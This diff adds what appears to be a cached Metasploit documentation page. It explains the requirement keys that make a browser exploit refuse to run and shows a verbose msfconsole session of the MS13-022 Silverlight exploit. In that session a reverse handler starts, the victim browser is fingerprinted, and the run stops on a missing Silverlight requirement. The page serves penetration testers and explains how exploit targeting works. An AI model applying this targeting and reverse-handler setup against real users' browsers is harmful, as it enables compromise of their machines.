@@ -1,0 +1,120 @@
+I"�<p>So I see your browser exploit has refused to attack due to some kind of unmet requirements. Typically this means one of the following:</p>
+
+<ul>
+  <li>Your target doesn’t have the right conditions to be exploited.</li>
+  <li>Your target isn’t vulnerable at all.</li>
+</ul>
+
+<p>The exploit should say what requirements are not met. The requirements are explained here:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Key</th>
+      <th>Description</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>:source</strong></td>
+      <td>Target has JavaScript disabled.</td>
+    </tr>
+    <tr>
+      <td><strong>:ua_name</strong></td>
+      <td>Target isn’t using the preferred browser. For example: Firefox, IE.</td>
+    </tr>
+    <tr>
+      <td><strong>:ua_ver</strong></td>
+      <td>Target isn’t using the preferred browser version.</td>
+    </tr>
+    <tr>
+      <td><strong>:os_name</strong></td>
+      <td>Target isn’t using the preferred operating system.</td>
+    </tr>
+    <tr>
+      <td><strong>:os_flavor</strong></td>
+      <td>This has been deprecated. If you see this, your Metasploit is most likely out of date.</td>
+    </tr>
+    <tr>
+      <td><strong>:language</strong></td>
+      <td>Target isn’t using the preferred OS language.</td>
+    </tr>
+    <tr>
+      <td><strong>:arch</strong></td>
+      <td>Target isn’t on the preferred architecture. For example: x86/x64</td>
+    </tr>
+    <tr>
+      <td><strong>:proxy</strong></td>
+      <td>Target has a proxy.</td>
+    </tr>
+    <tr>
+      <td><strong>:silverlight</strong></td>
+      <td>Target doesn’t have Silverlight installed.</td>
+    </tr>
+    <tr>
+      <td><strong>:office</strong></td>
+      <td>Target doesn’t have the preferred version of Microsoft Office installed, so the exploit cannot bypass DEP.</td>
+    </tr>
+    <tr>
+      <td><strong>:java</strong></td>
+      <td>Target doesn’t have the preferred version of Java. Often this is used by exploits to bypass DEP.</td>
+    </tr>
+    <tr>
+      <td><strong>:clsid</strong></td>
+      <td>Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :clsid.</td>
+    </tr>
+    <tr>
+      <td><strong>:method</strong></td>
+      <td>Target doesn’t have the preferred ActiveX control. If this is the problem, you will only see a mismatch with :activex instead of :method.</td>
+    </tr>
+    <tr>
+      <td><strong>:mshtml_build</strong></td>
+      <td>Target isn’t on the preferred build of Internet Explorer. Usually means only specific builds of IE are vulnerable.</td>
+    </tr>
+    <tr>
+      <td><strong>:flash</strong></td>
+      <td>Target isn’t using the preferred version of Adobe Flash. Often this is used by exploits to leverage code execution.</td>
+    </tr>
+    <tr>
+      <td><strong>:vuln_test</strong></td>
+      <td>A custom JavaScript-based check. There should be a custom vuln_test_error message explaining why on msfconsole.</td>
+    </tr>
+  </tbody>
+</table>
+
+<h3 id="how-to-manually-check-requirement-comparisons">How to manually check requirement comparisons:</h3>
+
+<p>If you’d like to check the comparisons, simply set VERBOSE to true. The following is an example:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf exploit(ms13_022_silverlight_script_object) &gt; set VERBOSE true
+VERBOSE =&gt; true
+msf exploit(ms13_022_silverlight_script_object) &gt; run
+[*] Exploit running as background job.
+
+[*] Started reverse handler on 192.168.1.64:4444 
+[*] Using URL: http://0.0.0.0:8080/SHIzaS2aZxIA6
+msf exploit(ms13_022_silverlight_script_object) &gt;
+[*]  Local IP: http://192.168.1.64:8080/SHIzaS2aZxIA6
+[*] Server started.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Received cookie 'sVfdquJGHzpHyLItxoTgeJI'.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - Gathering target information.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - Sending response HTML.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Info receiver page called.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'.
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Received sniffed browser data over POST: 
+{"os_name"=&gt;["Microsoft Windows"], "os_flavor"=&gt;["XP"], "ua_name"=&gt;["MSIE"], "ua_ver"=&gt;["8.0"], "arch"=&gt;["x86"], "java"=&gt;["null"], "silverlight"=&gt;["false"], "flash"=&gt;["null"], "office"=&gt;["null"], "mshtml_build"=&gt;["18702"]}.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Received cookie 'ZnKtXOQIvxAclSrEOxJ'.
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Serving exploit to user with tag ZnKtXOQIvxAclSrEOxJ
+[*] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Setting target "ZnKtXOQIvxAclSrEOxJ" to :tried.
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Comparing requirement: source=(?i-mx:script|headers) vs k=script
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Comparing requirement: os_name=Microsoft Windows vs k=Microsoft Windows
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Comparing requirement: ua_name=MSIE vs k=MSIE
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Comparing requirement: silverlight=true vs k=false
+[!] 192.168.1.80     ms13_022_silverlight_script_object - 192.168.1.80     ms13_022_silverlight_script_object - Comparing requirement: arch=x86 vs k=x86
+[!] 192.168.1.80     ms13_022_silverlight_script_object - Exploit requirement(s) not met: silverlight
+</code></pre></div></div>
+
+<h3 id="related-reading">Related Reading:</h3>
+
+<p>https://github.com/rapid7/metasploit-framework/wiki/How-to-write-a-browser-exploit-using-BrowserExploitServer</p>
+:ET
